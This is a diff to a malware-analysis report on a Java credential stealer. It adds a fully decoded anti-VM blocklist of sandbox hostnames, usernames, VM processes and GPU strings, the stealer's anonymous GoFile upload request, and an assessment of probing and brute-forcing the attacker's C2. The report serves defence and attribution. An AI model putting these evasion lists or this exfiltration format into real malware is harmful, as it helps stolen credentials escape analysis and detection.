@@ -558,39 +558,76 @@ for (String arg : args) {
 
 Uses Win32 `CreateMutex` via JNA (`a.b.d.j` — two `WinNT$HANDLE` fields) to prevent multiple instances running simultaneously.
 
-### 4. Anti-VM — Hostname/Username Blocklist (400+ entries)
+### 4. Anti-VM — Hostname/Username Blocklist (428 entries, fully decoded)
 
-Checks `System.getProperty("user.name")` and machine hostname against a hardcoded list. If matched, execution aborts. Sample entries:
+Class `a.b.c.u` checks `System.getenv("COMPUTERNAME")` and `System.getenv("USERNAME")` against a blocklist of **428 strings** stored in ZKM-encrypted `a[]` and lazily decrypted into `b[]` at runtime. If matched, execution aborts silently.
 
-`WDAGUtilityAccount` `azure` `test` `sandbox` `floppy` `DefaultAccount` `Guest`
-`COMPNAME_4803` `COMPNAME_4416` `COMPNAME_3485` `DESKTOP-0000000` `vmwaretray`
-`prl_tools` `vboxtray` `qemu-ga` `xenservice` + 390 more
+The complete blocklist was recovered via runtime reflection and `sun.misc.Unsafe` injection:
+
+```
+# VM/Sandbox hostname patterns
+DESKTOP-VMUZFZH    DESKTOP-VWJU7MF    DESKTOP-KFBUF9C    DESKTOP-4GCZVJU
+TVM-PC             TVM                HANBRO             Q9IATRKPRH
+WINZDS-BMSMD8ME    WINZDS-22URJIBV    WINZDS-AM76HPK2    WINZDS-5J75DTHH
+WINZDS-RST0E8VU    WINZDS-PU0URPVI    WINZDS-8MAEI8E4    WINZDS-B03L9CEO
+WINZDS-QNGKGN59    WINZDS-K7VIK4FC    WINZDS-1BHRVPQU    WINZDS-VQH86L5D
+WINZDS-U95191IG    WINZDS-3FF2I9SN    WINZDS-9IO75SVG    WINZDS-MILOBM35
+WINZDS-6TUIHN7R    WINZDS-BUAOKGG1
+COMPNAME_4803      COMPNAME_4416      COMPNAME_4047      COMPNAME_3485
+B30F0242-1C6A-4    BEE7370C-8C0C-4    6C4E733F-C2D9-4    18C9ACDF-7C00-4
+EA8C2E2A-D017-4    EFA0FDEC-8FA7-4
+DESKTOP-0000000    DESKTOP-SUPERIO    DESKTOP-VIRENDO
+LANTECH-LLC        PROPERTY-LTD       COFFEE-SHOP        CRYPTODEV222222
+SYKGUIDE-WS17      FERREIRA-W10       ZDS_EDR_9          ZDS_EDR_14
+WS-CARROT          JUDES-DOJO         GANGISTAN
+
+# Sandbox/analysis usernames
+WDAGUtilityAccount DefaultAccount     azure              Guest
+vmwaretray         vmwareuser         vmtoolsd           vmacthlp
+vboxservice        vboxtray           vmusrvc            prl_cc
+prl_tools          qemu-ga            xenservice         vgauthservice
+seajones           sal.rosenburg      eduardcarp         hmarc
+test42             test               fred               floppy
+```
+
+Notable entries:
+- `WINZDS-*` prefix — Zscaler sandbox hostname pattern (26 entries)
+- `CRYPTODEV222222` — targeted crypto developer sandbox
+- `SYKGUIDE-WS17` / `FERREIRA-W10` — specific researcher machines
+- `ZDS_EDR_9` / `ZDS_EDR_14` — EDR vendor test environments
+- `COFFEE-SHOP` / `LANTECH-LLC` / `PROPERTY-LTD` — corporate/public analysis environments
+- `COMPNAME_4803` / `4416` / `4047` / `3485` — automated sandbox hostname patterns
 
 ### 5. Anti-VM — Process Detection
 
-Checks running process list for virtualization-related processes:
+Class `a.b.e.u` enumerates running processes via Windows TlHelp32 (`CreateToolhelp32Snapshot`) through JNA. Process names sourced from fully decoded `a.b.c.u.b[]` runtime dump:
 
 | Process | Platform |
 |---------|---------|
-| `vmwaretray`, `vmwareuser`, `vmusrvc`, `vmtoolsd`, `vgauthservice`, `vmacthlp` | VMware |
-| `prl_cc`, `prl_tools` | Parallels |
-| `vboxtray`, `vboxservice` | VirtualBox |
-| `xenservice` | Xen |
-| `qemu-ga` | QEMU |
+| `vmwaretray.exe`, `vmwareuser.exe`, `vmusrvc.exe`, `vmtoolsd.exe`, `vmacthlp.exe` | VMware |
+| `vgauthservice.exe` | VMware Guest Auth |
+| `prl_cc.exe`, `prl_tools.exe` | Parallels |
+| `vboxtray.exe`, `vboxservice.exe` | VirtualBox |
+| `xenservice.exe` | Xen |
+| `qemu-ga.exe` | QEMU/KVM |
 
 ### 6. Anti-VM — GPU String Detection
 
-Checks display adapter device name:
+The payload queries the GPU adapter description via WMI (`Win32_VideoController.Description`). Full list recovered from decrypted `a.b.c.u.b[]` runtime dump:
 
-- `VMware SVGA 3D`
-- `VirtualBox Graphics Adapter`
-- `VirtualBox Graphics Adapter (WDDM)`
-- `Microsoft Hyper-V Video`
-- `Virtual Desktop Monitor`
-- `ASPEED Graphics Family(WDDM)`
-- `Standard VGA Graphics Adapter`
-- `Microsoft Basic Display Adapter`
-- `Microsoft Remote Display Adapter`
+| GPU String | Environment |
+|------------|-------------|
+| `VMware SVGA 3D` | VMware |
+| `VirtualBox Graphics Adapter` | VirtualBox (legacy driver) |
+| `VirtualBox Graphics Adapter (WDDM)` | VirtualBox (WDDM driver) |
+| `Microsoft Hyper-V Video` | Hyper-V |
+| `Microsoft Remote Display Adapter` | RDP / Remote Desktop |
+| `Microsoft Basic Display Adapter` | Bare VM / no GPU driver |
+| `Virtual Desktop Monitor` | Virtual display |
+| `Standard VGA Graphics Adapter` | Generic unrecognised GPU |
+| `ASPEED Graphics Family(WDDM)` | Server BMC/IPMI remote console |
+
+The `ASPEED Graphics Family` entry specifically targets server baseboard management controllers (BMCs), indicating the malware checks for researchers running samples on physical servers via IPMI remote console — an uncommon but sophisticated evasion.
 
 ---
 
@@ -698,6 +735,89 @@ dQw4w9WgXcQ:([^"\s]*)
 | T1057 | Process Discovery | CreateToolhelp32Snapshot + lsass.exe targeting |
 | T1083 | File and Directory Discovery | Wallet paths + Desktop .txt enumeration |
 | T1480 | Execution Guardrails | Mutex + single-instance enforcement |
+
+---
+
+## C2 Vulnerability Assessment
+
+This section documents active vulnerability research against the VoidLuneV3 C2 infrastructure conducted during analysis.
+
+### GoFile Upload Protocol — Fully Decoded
+
+The GoFile upload request format was recovered by injecting a capturing `HttpClient` subclass into the `static final` field of `a.b.e.gf` via `sun.misc.Unsafe.putObject()`, bypassing Java's final field restriction:
+
+```http
+POST https://upload.gofile.io/uploadfile HTTP/2
+Content-Type: multipart/form-data; boundary=---<System.currentTimeMillis()>
+
+-----<timestamp>
+Content-Disposition: form-data; name="file"; filename="<passed_filename>"
+Content-Type: application/zip
+
+[raw ZIP bytes]
+-----<timestamp>--
+```
+
+**Critical finding: No GoFile account token, folder ID, or authentication header is present.** Every victim upload is fully anonymous. GoFile generates a new random 6-character folder code per upload (`gofile.io/d/XXXXXX`). The attacker receives the download URL only via the C2 POST response — without C2 access, victim folder codes cannot be enumerated from our side.
+
+### Vulnerability Findings
+
+#### VLN-01 — Anonymous GoFile Uploads (Design Flaw)
+- **Severity:** INFORMATIONAL
+- **Description:** Victim data uploaded to GoFile with no account token or persistent folder association. Each victim's stolen credentials sit in an isolated anonymous folder.
+- **Attacker risk:** Any party reporting `swordfull.com` to GoFile abuse can request GoFile enumerate uploads from that domain's victim IPs server-side, potentially preserving evidence.
+- **Recommended action:** Report to `abuse@gofile.io` with reference to `swordfull.com`.
+
+#### VLN-02 — Predictable License Token Format
+- **Severity:** LOW
+- **Description:** Per-build auth tokens follow `license-<YYYYMMDDHHMMSS>-<4hex>`. The 4-hex suffix provides only 65,536 possibilities per timestamp.
+- **Observed token:** `license-20260326220248-ce21`
+- **Impact:** Brute-forceable if build timestamp is known. If the C2 panel authenticates solely on this token without rate limiting, forged submissions may be accepted.
+- **Status:** Not tested — C2 origin unreachable during analysis window.
+
+#### VLN-03 — Unencrypted ZIP Payload
+- **Severity:** MEDIUM
+- **Description:** Stolen credentials are packed into a raw ZIP file with no outer encryption before upload. Class `a.b.c.k` (Crypto_KeyUtility) contains only 4 encrypted strings, suggesting encryption is minimal or absent.
+- **Impact:** Any party obtaining a victim's GoFile folder code can immediately read all stolen credentials in plaintext.
+
+#### VLN-04 — Unobfuscated Maven Build Metadata (Developer Attribution)
+- **Severity:** HIGH (attribution)
+- **Description:** Maven POM metadata (`groupId: com.mirac`, `artifactId: private-project`) was not processed by Zelix KlassMaster and is present in plaintext in `META-INF/maven/`.
+- **Impact:** Directly exposes developer's Maven groupId. See [Developer Attribution](#developer-attribution).
+
+#### VLN-05 — C2 Origin IP Exposed to Cloudflare
+- **Severity:** HIGH (for operator)
+- **Description:** The real origin server IP is known to Cloudflare. Cloudflare's Network Error Logging (NEL) endpoint (`a.nel.cloudflare.com/report/v4`) collected telemetry on every connection attempt during this analysis.
+- **CF-Ray IDs collected during analysis:** `a0fee05e8db46778-DFW`, `a0fee06028c1f061-DFW`, `a0fee1fbb80f0862-DFW`, `a0fee82b68a86b1d-DFW`, `a0fefdf99d19dc2d-DFW`, `a0fefdfb1bc833ce-DFW`, `a0fefdfca8f8e956-DFW`
+- **Recommended action:** Submit these CF-Ray IDs to Cloudflare abuse team with a law enforcement referral.
+
+### C2 Origin Discovery Status
+
+| Method | Result |
+|--------|--------|
+| DNS A record (root) | NONE — orange-cloud only |
+| DNS subdomain enumeration (10 subdomains) | All NXDOMAIN |
+| Alternate port scan (80, 8080, 8443, 3000, 5000) | All TCP timeout |
+| Certificate transparency (crt.sh) | Query timeout |
+| HTTP response header leak | None — all Cloudflare headers |
+| Direct TLS fingerprint | Only Cloudflare edge cert visible |
+
+**Recommendation:** Legal request to Cloudflare (`abuse@cloudflare.com`) citing the CF-Ray IDs above and requesting origin server IP and access logs.
+
+### Can We Pull Data From the C2?
+
+| Attack Vector | Feasible? | Reason |
+|---------------|-----------|--------|
+| Direct POST to `/m/` (victim simulation) | **NO** | Cloudflare WAF block + origin offline |
+| GoFile victim folder enumeration | **NO** | Anonymous random 6-char codes, no API enumeration |
+| GoFile admin API access | **NO** | Requires premium account token |
+| License token brute force | **UNLIKELY** | 65,536 possibilities but origin currently offline |
+| C2 panel path discovery | **NO** | All paths return 530 (origin down) |
+| Alternate subdomains/ports | **NO** | None exposed |
+| Origin IP via Cloudflare legal request | **YES** | CF holds origin IP + NEL access logs |
+| Victim ZIP recovery via GoFile abuse report | **YES** | GoFile can enumerate by source IP server-side |
+
+**Assessment:** Direct C2 access is not possible from an external position. The two actionable vectors for victim data recovery or attacker identification are legal requests to Cloudflare (for origin IP) and GoFile (for victim file preservation).
 
 ---
 
